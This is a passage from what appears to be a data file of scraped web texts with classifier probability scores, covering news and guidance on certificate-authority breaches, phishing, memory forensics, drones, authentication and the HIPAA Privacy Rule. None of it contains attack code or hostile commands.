extract information from systems. I mean, even the most basic of informations, like knowing the memory map of a running windows system, is still an unkown! If you dd (dd - a linux tool also available on windows to dump bytes... be it memory, a drive, whatever - to a file, used to image disks or analyze memory or (yep) do forensics analysys) a windows machine's memory, how do you extract meaningful information out of it? How is it organized, what is the kernel region or the applications region? Process memory is part RAM part swap, how do you deal with that? If you crash dump a windows, you can analyze the dump information on MS's tools, but dd's output is not read by the debuggers, so we need tools for this :p Windows Incident Response Blog Posted by Andreia Gaita at 13:39",
        "prob": "tensor([[0.0128, 0.9872]])"
    },
    {
        "text": "A long-known but little-discussed vulnerability in the modern Internet's design was highlighted yesterday by a report that hackers traced to Iran spoofed the encryption procedures used to secure connections to Google, Yahoo, Microsoft, and other major Web sites. This design, pioneered by Netscape in the early and mid-1990s, allows the creation of encrypted channels to Web sites, an important security feature typically identified by a closed lock icon in a browser. The system relies on third parties to issue so-called certificates that prove that a Web site is legitimate when making an \"https://\" connection. The problem, however, is that the list of certificate issuers has ballooned over the years to approximately 650 organizations, which may not always follow the strictest security procedures. And each one has a copy of the Web's master keys. \"There is this problem that exists today where there are a very large number of certificate authorities that are trusted by everyone and everything,\" says Peter Eckersley, senior staff technologist at the Electronic Frontier Foundation who has compiled a list of them. This has resulted in a bizarre situation in which companies like Etisalat, a wireless carrier in the United Arab Emirates that implanted spyware on customers' BlackBerry devices, possess the master keys that can be used to impersonate any Web site on the Internet, even the U.S. Treasury, BankofAmerica.com, and Google.com. So do more than 100 German universities, the U.S. Department of Homeland Security, and random organizations like the Gemini Observatory, which operates a pair of 8.1-meter diameter telescopes in Hawaii and Chile. It's a situation that nobody would have anticipated nearly two decades ago when the cryptographic protection known as SSL (Secure Sockets Layer) began to be embedded into Web browsers. At the time, the focus was on securing the connections, not on securing the certificate authorities themselves--or limiting their numbers. \"It was the '90s,\" says security researcher Dan Kaminsky, who discovered a serious Domain Name System flaw in 2008. \"We didn't realize how this system would grow.\" Today, there are now about 1,500 master keys, or signing certificates, trusted by Internet Explorer and Firefox. The vulnerability of today's authentication infrastructure came to light after Comodo, a Jersey City, N.J.-based firm that issues SSL certificates, alerted Web browser makers that an unnamed European partner had its systems compromised. The attack originated from an Iranian Internet Protocol address, according to Comodo Chief Executive Melih Abdulhayoglu, who told CNET that the skill and sophistication suggested a government was behind the intrusion. Spoofing those Web sites would allow the Iranian government to use what's known as a man-in-the-middle attack to impersonate the legitimate sites and grab passwords, read e-mail messages, and monitor any other activities its citizens performed, even if Web browsers show that the connections were securely protected with SSL encryption. Comodo's revelation throws into sharp relief the list of flaws inherent in the current system. There is no automated process to revoke fraudulent certificates. There is no public list of certificates that companies like Comodo have issued, or even which of its resellers or partners have been given a duplicate set of the master keys. There are no mechanisms to prevent fraudulent certificates for Yahoo Mail or Gmail from being issued by compromised companies, or repressive regimes bent on surveillance; Tunisia even has its own certificate-issuing government agency. \"These organizations act as cornerstones of security and trust on the Internet, but it seems like they're not doing basic due diligence that other organizations are expect to do, like the banks,\" says Mike Zusman, managing consultant at Web app security firm Intrepidus Group. \"I'm not sure what we need to do but I think it's time we start addressing the issue of trust and issues of certificate authorities potentially not living up to standards that they should be.\" Over the last few years, a handful of papers and demonstrations at hacker conferences have focused more attention on the topic. But the Comodo intrusion, which appears to be the first public evidence of an actual attack on the way the Web handles authentication, could be a catalyst for rethinking the way to handle security. Two years ago, for instance, Zusman was able to get a certificate from Thawte, a VeriSign subsidiary, for \"login.live.com\" just based on an e-mail address he created on the Hotmail domain. Even though it was revoked, it still worked in a Web browser during a demonstration at the Black Hat conference in Las Vegas. Comodo, too, has previously been shown to have lax security standards among its resellers as far back as December 2008. \"Remember, the only reason Iran has to go to the lengths they've gone to to get certificates is because they don't have a (certificate issuer) of their own... most countries can just generate their own,\" says Moxie Marlinspike, chief technology officer of mobile app developer Whisper Systems, who has discovered serious problems with Web authentication before. One problem, he says, is that companies that issue certificates have a strong economic incentive to make it as easy as possible to obtain them. Another worrisome aspect is that browser makers don't always have a good way to revoke fraudulent certificates. A discussion thread at Mozilla.org, makers of the Firefox browser, shows that after being alerted by Comodo, they had no process to revoke the faux certificates. Mozilla developers ended up having to write new code and test a patch, which took a few days and, even after its release, meant that only users who downloaded new versions of Firefox benefit. Google's Chrome, on the other hand, uses a transparent update system for desktop versions but not necessarily mobile ones. Microsoft said yesterday that \"an update is available for all supported versions of Windows to help address this issue.\" Ross Anderson, professor of security engineering at the University of Cambridge's computer laboratory, offered an anecdote in this paper (PDF): \"I asked a panelist from the Mozilla Foundation why, when I updated Firefox the previous day, it had put back a certificate I'd previously deleted, from an organisation associated with the Turkish military and intelligence services. The Firefox spokesman said that I couldn't remove certificates--I had to leave them in but edit them to remove their capabilities - while an outraged Turkish delegate claimed that the body in question was merely a 'research organisation.'\" Jacob Appelbaum, a Tor Project developer who is a subject of a legal spat with the Justice Department over his work with WikiLeaks, says Mozilla should have warned of the vulnerability immediately and shipped Firefox 4 with a way to detect and revoke bad certificates turned on by default. (The technique is called Online Certificate Status Protocol, or OSCP). \"Mozilla's not taking their responsibility to the Internet seriously,\" said Appelbaum, who wrote an independent analysis of the situation. \"A Web browser isn't a toy. It's being used as a tool to overthrow governments...At the end of the day, they did not put their users first.\" Some long-term technical fixes have been proposed, with names like DANE, HASTLS, CAA (Comodo's Philip Hallam-Baker is a co-author), and Monkeysphere. The technology known as Domain Name System Security Extensions, or DNSSEC, can help. The Electronic Frontier Foundation's Eckersley, who runs the groups SSL Observatory that tracks SSL certificates, hints that he'll soon offer another proposal about how to reinforce the Web's cryptographic architecture. \"We do in fact need a way not to trust everyone,\" Eckersley says. \"We have 1,500 master certificates for the Web running around. That's 1,500 places that could be hacked and all of a sudden you have to scramble to dream up a solution.\"",
        "prob": "tensor([[2.0811e-06, 1.0000e+00]])"
    },
    {
        "text": "A new type of sophisticated — and convincing — malicious e-mail attack has targeted university accounts. Twice this academic year (Oct. 29 and Feb. 8) some U-M e-mail users have received a message that includes a logo associated with a real, although former, U-M organization. Known as phishing, such attacks are employed by scammers in an attempt to gather personal information from users. Anyone receiving an e-mail that looks suspicious is asked to go to safecomputing.umich.edu/main/phishing_alerts/ for the latest list of phishing messages sent to university e-mail accounts, or contact firstname.lastname@example.org. “This message attracted responses from at least 30 users and possibly others we don’t know about. We contacted those we could identify to alert them it was a scam,” says Will Rhee, one of the university’s user advocates. “Not everyone who responded gave away their real password.” Besides using the old Information Technology Central Services logo, this e-mail also employed a convincing re-direction: any user who did click the link was directed to an exact duplication of U-M’s authentication page. After entering a username and password — which was captured — the user was then redirected to U-M’s real page, as though the information had perhaps been mistyped. This latest attack demonstrates how cyber-criminals are looking for fresh and new ways to scam users, Information and Technology Services officials say. “We can’t say it enough — users must be careful about what they click on,” Rhee says. “Some people may feel like they don’t have much of value to protect in their e-mail, file space, or on their personal computer. However, stolen passwords are valuable because they are used to leverage U-M computing resources to facilitate crimes. “Your uniqname and password unlock access to networked resources that criminals want (e-mail, storage, network bandwidth, central processing unit, etc.) in order to be able to commit crimes and obfuscate who is responsible.” According to the February RSA Online Fraud Report, phishing attacks against public colleges and universities have increased in 2010 compared with 2009. The report suggests that student accounts are widely targeted because, “Compromised webmail accounts may give phishers another foothold in students’ personal computers, since compared with other unsolicited e-mail content, spam e-mails would gain credibility when coming from peers, especially if messages are sent from a university webmail address.” To read the full report, go to www.rsa.com/solutions/consumer_authentication/intelreport/10763_Online_Fraud_report_0210.pdf. The university offers guidance for faculty and staff who create e-mails that include links to forms or Web sites that ask for personal information (surveys, for example). • For guidelines to better e-mail security practices, go to tinyurl.com/um-safe-email. • To view a sample of the phishing message sent to some U-M e-mail accounts, go to tinyurl.com/um-phish-sample. Carrie Stefanski, right, marketing communications specialist, Information & Technology Services, on roller derby action: “I was able to get up quickly and rush to the front of the pack and knock down the opposing jammer. It was very satisfying.”",
        "prob": "tensor([[2.1202e-06, 1.0000e+00]])"
    },
    {
        "text": "The Reaper and the future of military flight A U.S. army soldier with prepares to launch a UAV -- or drone -- outside Combat Outpost Nolen in the village of Jellawar in The Arghandab Valley. There's an ongoing debate over the ethics of fighting war in a detached, videogame-like manner. You have planes launching missiles on human targets on the ground in Afghanistan but the pilots of those planes are sitting at a console somewhere in Nevada. But that debate hasn't slowed a global push in UAVs. They're cheaper, fewer of your own personnel are put at risk. It's the future. The U.S. has been using Predator drones for a while now. But Predator was built as a spy plane, then retrofitted to carry weapons. Predator is being phased out in favor of a plane called the Reaper. We're joined by Gary Solis. He's an adjunct professor at Georgetown University School of Law and teaches the law of war. As for the difference between the Predator and the Reaper, he says the Reaper \"is bigger, better, faster and has a greater payload. It weighs 5 tons, which is 4x what a Predator weighs. Predator can carry 2 hellfire missiles while a reaper can carry 14. A Predator can fly 140 MPH, Reaper can fly 275 MPH depending on payload.\" At the same time, other countries are developing their own technology and their own drones. Gary talks about one surveillance vehicle out of Israel that essentially looks like a pencil with helicopter blades. Also in this program, Rupert Murdoch plans to launch a newspaper for iPads. Because what everyone wants from the technology of an iPad is to have it be more like a printed newspaper.",
        "prob": "tensor([[0.0061, 0.9939]])"
    },
    {
        "text": "what is the difference between authentication and authorization Authentication is the process of obtaining identification credentials such as name and password from a user and validating those credentials against some authority. If the credentials are valid, the entity that submitted the credentials is considered an authenticated identity. Once an identity has been authenticated, the authorization process determines whether that identity has access to a given resource. The purpose of authorization is to determine whether an identity should be granted the requested type of access to a given resource If you are facing any programming issue, such as compilation errors or not able to find the code you are looking for. Ask your questions, our development team will try to give answers to your questions.",
        "prob": "tensor([[0.0729, 0.9271]])"
    },
    {
        "text": "HIPAA Privacy Rule and Public Health Guidance from CDC and the U.S. Department of Health and Human Services* The material in this report originated in the Epidemiology Program Office, Stephen B. Thacker, M.D., M.Sc., Director. New national health information privacy standards have been issued by the U.S. Department of Health and Human Services (DHHS), pursuant to the Health Insurance Portability and Accountability Act of 1996 (HIPAA). The new regulations provide protection for the privacy of certain individually identifiable health data, referred to as protected health information (PHI). Balancing the protection of individual health information with the need to protect public health, the Privacy Rule expressly permits disclosures without individual authorization to public health authorities authorized by law to collect or receive the information for the purpose of preventing or controlling disease, injury, or disability, including but not limited to public health surveillance, investigation, and intervention. Public health practice often requires the acquisition, use, and exchange of PHI to perform public health activities (e.g., public health surveillance, program evaluation, terrorism preparedness, outbreak investigations, direct health services, and public health research). Such information enables public health authorities to implement mandated activities (e.g., identifying, monitoring, and responding to death, disease, and disability among populations) and accomplish public health objectives. Public health authorities have a long history of respecting the confidentiality of PHI, and the majority of states as well as the federal government have laws that govern the use of, and serve to protect, identifiable information collected by public health authorities. The purpose of this report is to help public health agencies and others understand and interpret their responsibilities under the Privacy Rule. Elsewhere, comprehensive DHHS guidance is located at the HIPAA website of the Office for Civil Rights (http://www.hhs.gov/ocr/hipaa/). The shift of medical records from paper to electronic formats has increased the potential for individuals to access, use, and disclose sensitive personal health data. Although protecting individual privacy is a long-standing tradition among health-care providers and public health practitioners in the United States, previous legal protections at the federal, tribal, state, and local levels were inconsistent and inadequate. A patchwork of laws provided narrow privacy protections for selected health data and certain keepers of that data (1). The U.S. Department of Health and Human Services (DHHS) has addressed these concerns with new privacy standards that set a national minimum of basic protections, while balancing individual needs with those of society. The Health Insurance Portability and Accountability Act of 1996 (HIPAA) was adopted to ensure health insurance coverage after leaving an employer and also to provide standards for facilitating health-care--related electronic transactions. To improve the efficiency and effectiveness of the health-care system, HIPAA included administrative simplification provisions that required DHHS to adopt national standards for electronic health-care transactions (2). At the same time, Congress recognized that advances in electronic technology could erode the privacy of health information. Consequently, Congress incorporated into HIPAA provisions that mandated adoption of federal privacy protections for certain individually identifiable health information. The HIPAA Privacy Rule (Standards for Privacy of Individually Identifiable Health Information) (3) provides the first national standards for protecting the privacy of health information. The Privacy Rule regulates how certain entities, called covered entities, use and disclose certain individually identifiable health information, called protected health information (PHI). PHI is individually identifiable health information that is transmitted or maintained in any form or medium (e.g., electronic, paper, or oral), but excludes certain educational records and employment records. Among other provisions, the Privacy Rule The deadline to comply with the Privacy Rule is April 14, 2003, for the majority of the three types of covered entities specified by the rule [45 CFR § 160.102]. The covered entities are At DHHS, the Office for Civil Rights (OCR) has oversight and enforcement responsibilities for the Privacy Rule. Comprehensive guidance and OCR answers to hundreds of questions are available at http://www.hhs.gov/ocr/hipaa (4). Impact on Public Health Public health practice and research, including such traditional public health activities as program operations, public health surveillance, program evaluation, terrorism preparedness, outbreak investigations, direct health services, and public health research, use PHI to identify, monitor, and respond to disease, death, and disability among populations. Public health authorities have a long history of protecting and preserving the confidentiality of individually identifiable health information. They also recognize the importance of protecting individual privacy and respecting individual dignity to maintaining the quality and integrity of health data. CDC and others have worked to consistently strengthen federal and state public health information privacy practices and legal protections (5). DHHS recognized the importance of sharing PHI to accomplish essential public health objectives and to meet certain other societal needs (e.g., administration of justice and law enforcement). Therefore, the Privacy Rule expressly permits PHI to be shared for specified public health purposes. For example, covered entities may disclose PHI, without individual authorization, to a public health authority legally authorized to collect or receive the information for the purpose of preventing or controlling disease, injury, or disability [45 CFR § 164.512(b)] (Box 1). Further, the Privacy Rule permits covered entities to make disclosures that are required by other laws, including laws that require disclosures for public health purposes. Thus, the Privacy Rule provides for the continued functioning of the U.S public health system. Covered entities should become fully aware of the scope of permissible disclosures for public health activities as well as state and local reporting laws and regulations. Moreover, a public health authority may also be a covered entity. For example, a public health agency that operates a health clinic, providing essential health-care services and performing covered transactions electronically, is a covered entity. This report provides guidance to public health authorities and their authorized agents, researchers, and health-care providers in interpreting the Privacy Rule as it affects public health. CDC recommends that public health authorities share the information in this report with covered health-care providers and other covered entities and work closely with those entities to ensure implementation of the rule consistent with its intent to protect privacy while permitting authorized public health activities to continue. Overview of the Privacy Rule Who Is Covered The authority of DHHS to issue health-information privacy regulations was limited by Congress in HIPAA to a defined set of covered entities. More complete definitions of these, and other terms, are located elsewhere in this report (Appendix A). Covered entities are as follows: The Privacy Rule also establishes requirements for covered entities with regard to their nonemployee business associates (e.g., lawyers, accountants, billing companies, and other contractors) whose relationship with covered entities requires sharing of PHI. The Privacy Rule allows a covered provider or health plan to disclose PHI to a business associate if satisfactory written assurance is obtained that the business associate will use the information only for the purposes for which it was engaged, will safeguard the information from misuse, and will help the covered entity comply with certain of its duties under the Privacy Rule. The Privacy Rule does not apply to all persons or entities that regularly use, disclose, or store individually identifiable health information. For example, the Privacy Rule does not cover employers, certain insurers (e.g., auto, life, and worker compensation), or those public agencies that deliver social security or welfare benefits, when functioning solely in these capacities. Types of Health Information Protected Health Information The Privacy Rule protects certain information that covered entities use and disclose. This information is called protected health information (PHI), which is generally individually identifiable health information that is transmitted by, or maintained in, electronic media or any other form or medium. This information must relate to 1) the past, present, or future physical or mental health, or condition of an individual; 2) provision of health care to an individual; or 3) payment for the provision of health care to an individual. If the information identifies or provides a reasonable basis to believe it can be used to identify an individual, it is considered individually identifiable health information. De-identified data (e.g., aggregate statistical data or data stripped of individual identifiers) require no individual privacy protections and are not covered by the Privacy Rule. De-identifying can be conducted through In certain instances, working with de-identified data may have limited value to clinical research and other activities. When that is the case, a limited data set may be useful. Limited Data Sets Health information in a limited data set is not directly identifiable, but may contain more identifiers than de-identified data that has been stripped of the 18 identifiers [45 CFR § 164.514] (Box 3). A data-use agreement must establish who is permitted to use or receive the limited data set, and provide that the recipient will What is Required For covered entities using or disclosing PHI, the Privacy Rule establishes a range of health-information privacy requirements and standards that attempt to balance individual privacy interests with the community need to use such data [45 CFR § 164.504]. Among its provisions, the Privacy Rule requires covered entities to With respect to individuals, they are vested with the following rights: Required PHI Disclosures A covered entity is required by the Privacy Rule to disclose PHI in only two instances: 1) when an individual has a right to access an accounting of his or her PHI (see previous paragraph); and 2) when DHHS needs PHI to determine compliance with the Privacy Rule [45 CFR § 164.502(a)(2)]. Certain other uses and disclosures of PHI may be permitted without authorization, but are not required by the Privacy Rule. However, other federal, tribal, state, or local laws may compel disclosure. Permitted PHI Disclosures Without Authorization The Privacy Rule permits a covered entity to use and disclose PHI, with certain limits and protections, for TPO activities [45 CFR § 164.506]. Certain other permitted uses and disclosures for which authorization is not required follow. Additional requirements and conditions apply to these disclosures. The Privacy Rule text and OCR guidance should be consulted for a full understanding of the following: Other Authorized Disclosures A valid authorization is required for any use or disclosure of PHI that is not required or otherwise permitted without authorization by the Privacy Rule. In general, these authorizations must The Privacy Rule and Public Health The Privacy Rule recognizes 1) the legitimate need for public health authorities and others responsible for ensuring the public's health and safety to have access to PHI to conduct their missions; and 2) the importance of public health reporting by covered entities to identify threats to the public and individuals. Accordingly, the rule 1) permits PHI disclosures without a written patient authorization for specified public health purposes to public health authorities legally authorized to collect and receive the information for such purposes, and 2) permits disclosures that are required by state and local public health or other laws. However, because the Privacy Rule affects the traditional ways PHI is used and exchanged among covered entities (e.g., doctors, hospitals, and health insurers), it can affect public health practice and research in multiple ways. To prevent misconceptions, understanding the Privacy Rule is important for public health practice. Some illustrative examples are presented in this report (Box 4). Also provided are sample letters that might prove useful in clarifying relationships involving public health and the Privacy Rule (Appendix B). A public health authority is broadly defined as including agencies or authorities of the United States, states, territories, political subdivisions of states or territories, American Indian tribes, or an individual or entity acting under a grant of authority from such agencies and responsible for public health matters as part of an official mandate. Public health authorities include federal public health agencies (e.g., CDC, National Institutes of Health [NIH], Health Resources and Services Administration [HRSA], Substance Abuse and Mental Health Services Administration [SAMHSA], Food and Drug Administration [FDA], or Occupational Safety and Health Administration [OSHA]); tribal health agencies; state public health agencies (e.g., public health departments or divisions, state cancer registries, and vital statistics departments); local public health agencies; and anyone performing public health functions under a grant of authority from a public health agency [45 CFR § 164.501]. Public health agencies often conduct their authorized public health activities with other entities by using different mechanisms (e.g., contracts and memoranda or letters of agreement). These other entities are public health authorities under the Privacy Rule with respect to the activities they conduct under a grant of authority from such a public health agency. A covered entity may disclose PHI to public health authorities and to these designated entities pursuant to the public health provisions of the Privacy Rule. The Privacy Rule permits covered entities to disclose PHI, without authorization, to public health authorities or other entities who are legally authorized to receive such reports for the purpose of preventing or controlling disease, injury, or disability. This includes the reporting of disease or injury; reporting vital events (e.g., births or deaths); conducting public health surveillance, investigations, or interventions; reporting child abuse and neglect; and monitoring adverse outcomes related to food (including dietary supplements), drugs, biological products, and medical devices [45 CFR 164.512(b)]. Covered entities may report adverse events related to FDA-regulated products or activities to public agencies and private entities that are subject to FDA jurisdiction [45 CFR 164.512(b)(1)(iii)]. To protect the health of the public, public health authorities might need to obtain information related to the individuals affected by a disease. In certain cases, they might need to contact those affected to determine the cause of the disease to allow for actions to prevent further illness. Also, covered entities may, at the direction of a public health authority, disclose protected health information to a foreign government agency that is acting in collaboration with a public health authority [45 CFR 164.512(b)(1)(i)]. To receive PHI for public health purposes, public health authorities should be prepared to verify their status and identity as public health authorities under the Privacy Rule. To verify its identity, an agency could provide any one of the following: Public health authorities receiving information from covered entities as required or authorized by law [45 CFR 164.512(a)] [45 CFR 164.512(b)] are not business associates of the covered entities and therefore are not required to enter into business associate agreements. Public health authorities that are not covered entities also are not required to enter into business associate agreements with their public health partners and contractors. Also, after PHI is disclosed to a public health authority pursuant to the Privacy Rule, the public health authority (if it is not a covered entity) may maintain, use, and disclose the data consistent with the laws, regulations, and policies applicable to the public health authority. Disclosures for Public Health Purposes The Privacy Rule allows covered entities to disclose PHI to public health authorities when required by federal, tribal, state, or local laws [45 CFR 164.512(a)]. This includes state laws (or state procedures established under such law) that provide for receiving reporting of disease or injury, child abuse, birth, or death, or conducting public health surveillance, investigation, or intervention. For disclosures not required by law, covered entities may still disclose, without authorization, to a public health authority authorized by law to collect or receive the information for the purpose of preventing or controlling disease, injury, or disability, the minimum necessary information to accomplish the intended public health purpose of the disclosure [45 CFR 164.512 (b)] (Box 1). For example, to protect the health of the public, public health officials might need to obtain information related to persons affected by a disease. In certain cases, they might need to contact those affected to determine the cause of the disease to allow for actions to prevent further illness. The Privacy Rule continues to allow for the existing practice of sharing PHI with public health authorities who are authorized by law to collect or receive such information to aid them in their mission of protecting the health of the public. Examples of such activities include those directed at the reporting of disease or injury, reporting adverse events, reporting births and deaths, and investigating the occurrence and cause of injury and disease (1). Although it is not a defined term, DHHS interpreted the phrase \"authorized by law\" to mean that a legal basis exists for the activity. Further, DHHS called the phrase \"a term of art,\" including both actions that are permitted and actions that are required by law [64 FR 59929, November 3, 1999]. This does not mean a public health authority at the federal, tribal, state, or local level must have multiple disease or condition-specific laws that authorize each collection of information. Public health authorities operate under broad mandates to protect the health of their constituent populations. Requirements for Covered Entities Accounting for Public Health Disclosures Although the Privacy Rule permits disclosures of PHI to public health authorities, covered entities must comply with certain requirements related to these disclosures. One such requirement is that a covered entity must be able to provide an individual, upon request, with an accounting of certain disclosures of PHI. The covered entity is not required to account for all disclosures of PHI. For example, an accounting is not required for disclosures made However, usually an accounting is required for disclosures made without authorization, including public health purposes. The required accounting for disclosures may be accomplished in different ways. Typically, the covered entity must provide the individual with an accounting of each disclosure by date, the PHI disclosed, the identity of the recipient of the PHI, and the purpose of the disclosure. However, where the covered entity has, during the accounting period, made multiple disclosures to the same recipient for the same purpose, the Privacy Rule provides for a simplified means of accounting. In such cases, the covered entity need only identify the recipient of such repetitive disclosures, the purpose of the disclosure, and describe the PHI routinely disclosed. The date of each disclosure need not be tracked. Rather, the accounting may include the date of the first and last such disclosure during the accounting period, and a description of the frequency or periodicity of such disclosures. For example, the vast amount of data exchanged between covered entities and public health authorities is made through ongoing, regular reporting or inspection requirements. A covered health-care provider may routinely report all cases of measles it diagnoses to the local public health authority. An accounting of such disclosures to a requesting individual would need to identify the local public health authority receiving the PHI, the PHI disclosed, the purpose of the disclosure (required for communicable disease surveillance), the periodicity (weekly), and the first and last dates of such disclosures during the accounting period (May 1, 2003 to June 1, 2003). Thus, the covered entity would not need to annotate each patient's medical record whenever a routine public health disclosure was made. Notice of Privacy Practices With certain exceptions, under the Privacy Rule, individuals have the right to adequate notice of the uses and disclosures of PHI that may be made by the covered entity, as well as their rights and the covered entity's legal obligations. Notices must be in plain language and clearly posted. Certain covered entities must make a good faith effort to obtain an individual's acknowledgment of receipt of this notice. In certain cases, notice may be provided electronically. Minimum Necessary Standard The Privacy Rule usually directs covered entities to limit the amount of information disclosed to the minimum necessary to achieve the specified goal [45 CFR § 164.514(d)(1)]. This requirement usually applies to disclosures to a public health agency. It would not apply, however, if the disclosure were required by law, authorized by the individual, or for treatment purposes. A covered entity may also reasonably rely on a public official's determination that the information requested is the minimum necessary for the public health purpose. Public Health Authorities Performing Covered Functions Public health authorities at the federal, tribal, state, or local levels that perform covered functions (e.g., providing health care or insuring individuals for health-care costs), may be subject to the Privacy Rule's provisions as covered entities. For example, a local public health authority that operates a health clinic providing essential health-care services to low-income persons and performs certain electronic transactions might be defined under the Privacy Rule as a covered health-care provider and therefore a covered entity. Flow charts and interactive tools designed to help determine covered entity status are provided online by the Centers for Medicare and Medicaid Services, available at http://www.cms.gov/hipaa/hipaa2/support/tools/decisionsupport/default.asp. The following are examples of public health authority functions that make them covered entities: The Privacy Rule and Public Health Research The topic of research under the Privacy Rule is covered in depth in the DHHS report, Protecting Personal Health Information in Research --- Understanding the HIPAA Privacy Rule (6). The Privacy Rule provides separate provisions for disclosure without individual authorization for public health purposes and for certain research [45 CFR § 164.512(b)] [45 CFR § 164.512(i)]. Other federal law pertaining to research stresses the importance of distinguishing between research and practice to ensure that human subjects are appropriately protected [45 CFR Part 46]. For certain activities, this distinction is not always clear. A full discussion of the distinctions between public health practice and research is beyond the scope of this document. However, CDC and others provide guidance in this area (7--9). Research Versus Practice The definition of research is the same for the Privacy Rule and the Common Rule (10) --- systematic investigation, including research development, testing, and evaluation, designed to develop or contribute to generalizable knowledge. Research is designed to test a hypothesis, permit conclusions to be drawn, and thereby to develop or contribute to generalizable knowledge. The majority of public health activities (e.g., public health surveillance, and disease prevention and control projects) are based on scientific evidence and data collection or analytic methods similar to those used in research. However, they are not designed to contribute to generalizable knowledge. Their primary purpose is to protect the health of the population through such activities as disease surveillance, prevention, or control. The Belmont Report (11) defines practice as interventions designed solely to enhance the well-being of a person, patient, or client, and which have reasonable expectation of success. The report further states that the purpose of medical or behavioral practice is to provide diagnosis, preventive treatment, or therapy to particular patients. For public health agencies, the patient is the community. Public health practice activities (e.g., public health surveillance, disease control, or program evaluation) are undertaken with the intent to benefit a specific community, although occasionally they may provide unintended generalizable benefits to others. Some public health activities that are initially public health practice may subsequently evolve into a research activity (e.g., an investigation to determine the cause of an outbreak that incorporates a research study evaluating the efficacy of a new drug to treat the illness). When that is the case, the disclosures may be made initially under the public health provisions of the Privacy Rule. But when the activity becomes an ongoing research activity, the entity should consider application of the relevant research disclosures provisions to continue to obtain information for this purpose. Moreover, there may be cases where the activity is both research and public health practice (e.g., an ongoing survey to monitor health conditions in the population, data from which can also be analyzed for research purposes). In those cases, disclosures may be made either under the research provisions or the public health provisions, as appropriate --- the covered entity need not comply with both sets of requirements. The Privacy Rule and Other Laws References to non-DHHS sites on the Internet are provided as a service to MMWR readers and do not constitute or imply endorsement of these organizations or their programs by CDC or the U.S. Department of Health and Human Services. CDC is not responsible for the content of these sites. URL addresses listed in MMWR were current as of the date of publication. Federal Government Resources DHHS Office for Civil Rights --- HIPAA guidelines CDC --- Privacy Rule guidelines Centers for Medicare and Medicaid Services Health Resources and Services Administration --- HIPAA National Center for Health Statistics National Committee on Vital and Health Statistics National Health Information Infrastructure Indian Health Service --- HIPAA National Institutes of Health Substance Abuse and Mental Health Services Administration --- HIPAA State Government Resources Associations, Nonprofit Organizations, and Academic Resources American Hospital Association --- HIPAA American Medical Association --- HIPAA Association of State and Territorial Health Officials --- HIPAA Georgetown University Health Privacy Project Joint Healthcare Information Technology Alliance National Association of Health Data Organizations National Association of Insurance Commissioners National Governors Association --- HIPAA North Carolina Healthcare Information and Communications Alliance Public Health Grand Rounds HIPAA Privacy Rule: Enhancing or Harming Public Health? Stanford University Medical School --- HIPAA Workgroup for Electronic Data Interchange --- Strategic National Implementation Process This report was prepared by Salvatore Lucido, M.P.A., and Denise Koo, M.D., Office of the Associate Director for Science, Epidemiology Program Office, CDC, in collaboration with James G. Hodge, Jr., J.D., Center for Law and the Public's Health, Georgetown and Johns Hopkins Universities, Baltimore, Maryland. The preparers are grateful for the participation of Deborah Tress, J.D., Kenya Ford, J.D., and Heather Horton, J.D., Office of the General Counsel, Department of Health and Human Services, CDC/ATSDR Branch; the CDC Working Group on the Privacy Rule; and Beverly Dozier, J.D., Lance A. Gable, J.D., Lawrence O. Gostin, J.D., Gail Horlick, J.D., and Jennifer Kurle. The preparers also thank the following partners for their valuable input: Association of State and Territorial Health Officers, Council of State and Territorial Epidemiologists, National Association of County and City Health Officials, National Association of Health Data Organizations, Association of Public Health Laboratories, and National Association for Public Health Statistics and Information Systems. * Prepared by CDC staff, in consultation with the Office of the General Counsel, the Office for Civil Rights, other offices and agencies within the U.S. Department of Health and Human Services, Washington, D.C., and health privacy specialists.Box 1 Return to top. Return to top. Return to top. Return to top. Disclaimer All MMWR HTML versions of articles are electronic conversions from ASCII text into HTML. This conversion may have resulted in character translation or format errors in the HTML version. Users should not rely on this HTML document, but are referred to the electronic PDF version and/or the original MMWR paper copy for the official text, figures, and tables. An original paper copy of this issue can be obtained from the Superintendent of Documents, U.S. Government Printing Office (GPO), Washington, DC 20402-9371; telephone: (202) 512-1800. Contact GPO for current prices.**Questions or messages regarding errors in formatting should be addressed to email@example.com. Page converted: 4/11/2003 This page last reviewed 4/11/2003",
        "prob": "tensor([[0.0964, 0.9036]])"
    },
    {
        "text": "Apr. 11, 2011 The Internet has no borders, no universal legislation, and although highly social and distributed is not represented by cooperation across the globe. Given those characteristics how might nations make their plans for counter terrorism in cyberspace as active online as they are in the everyday world? A collaboration between researchers in the US and Iran hoped to address that issue and its findings are published this month in the International Journal of Internet Technology and Secured Transactions. Incidence of online crime has grown considerably in recent years, with terms such as malware, Trojans, bot-nets and phishing attacks entering the common vernacular. There has also been a significant increase in activity that might at best be described as international commercial sabotage but that some would label more sensationally as cyber-terrrorism. Much of the illicit activity that leads to internet outages, malware infections and other virtual atrocities are being carried out with purely criminal intent. However, there are alleged attacks orchestrated by whole nations against other countries, corporations and organizations that might truly be described more accurately as a form of terrorism. Arash Barfar from the University of South Florida in Tampa and Kiyana Zolfaghar and her colleague from the KN Toosi University of Technology in Tehran, suggest that the first step that must be taken to surmount the barriers of failed cooperation and legislation is to organize national efforts to use \"web mining\" techniques and \"honeypots\" to wheedle out cyber-terrorists before they attack. \"The internet is a very important channel not only for communication, but also for searching information and for doing business, the pattern of counter terrorism should efficiently reflect that,\" the team says. They have now developed a framework that would allow leaders to develop and use the necessary tools to trace cyber terrorists effectively in real-time and to make arrests before any potentially debilitating attack were to take place. Journal: \"A framework for cyber war against international terrorism\" in Internet Technology and Secured Transactions, 2011, 3, 29-39 Other social bookmarking and sharing tools: Note: If no author is given, the source is cited instead.",
        "prob": "tensor([[3.4340e-05, 9.9997e-01]])"
    },
    {
